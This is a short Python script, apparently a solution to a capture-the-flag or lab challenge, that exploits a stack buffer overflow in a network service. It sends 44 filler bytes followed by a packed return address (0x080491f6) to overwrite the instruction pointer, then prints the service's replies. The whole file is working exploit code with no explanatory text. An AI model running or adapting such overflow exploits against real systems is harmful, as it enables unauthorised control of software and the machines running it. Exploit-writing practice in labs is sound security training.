import struct
import socket
import argparse




parser = argparse.ArgumentParser()
parser.add_argument(
    "host",
    type = str,
    help = "The hostname or IP address to connect to",
)

parser.add_argument(
    "port",
    type = int,
    help = "The port for the service to connect to",
)

args = parser.parse_args()

# b means byte
# new_eip = new instruction pointer

offset = 44
new_eip = struct.pack("<I", 0x080491f6)

payload = b"".join([
    b"A" * offset,
    new_eip,
])

payload += b"\n"

with socket.socket() as connection:
    connection.connect((args.host, args.port))
    # print(connection.recv(4096).decode("utf-8"))
    connection.recv(4096).decode("utf-8")
    connection.send(payload)
    print(connection.recv(4096).decode("utf-8"))
    # connection.recv(4096).decode("utf-8")
    print(connection.recv(4096).decode("utf-8"))

